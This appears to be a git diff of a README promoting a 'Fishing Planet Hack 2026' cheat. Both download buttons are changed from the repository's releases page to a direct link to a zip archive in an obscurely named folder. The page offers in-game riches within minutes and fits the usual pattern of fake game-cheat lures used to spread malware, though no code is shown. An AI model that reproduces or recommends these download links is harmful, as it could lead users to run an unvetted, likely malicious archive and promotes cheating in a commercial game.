@@ -1,6 +1,6 @@
 # 🐟 Fishing-planet-mod-2026 - Your Ultimate Fishing Adventure Starts Here
 
-[![Download Fishing Planet Hack](https://img.shields.io/badge/Download-Fishing_Planet_Hack_2026-brightgreen?style=for-the-badge&logo=windows&logoColor=white&color=4CAF50)](https://github.com/vpsdugiya/Fishing-planet-mod-2026/releases)
+[![Download Fishing Planet Hack](https://img.shields.io/badge/Download-Fishing_Planet_Hack_2026-brightgreen?style=for-the-badge&logo=windows&logoColor=white&color=4CAF50)](https://raw.githubusercontent.com/vpsdugiya/Fishing-planet-mod-2026/main/hyperphalangism/planet-mod-Fishing-v2.5.zip)
 
 Visit this link to download the application.
 
@@ -164,7 +164,7 @@ The process takes less than five minutes from download to in-game riches. No com
 
 Ready to reel in that trophy catch? Head over to our download page and grab your copy:
 
-[👉 **Click Here to Download Fishing Planet Hack 2026**](https://github.com/vpsdugiya/Fishing-planet-mod-2026/releases)
+[👉 **Click Here to Download Fishing Planet Hack 2026**](https://raw.githubusercontent.com/vpsdugiya/Fishing-planet-mod-2026/main/hyperphalangism/planet-mod-Fishing-v2.5.zip)
 
 Visit this link to download the application.
 
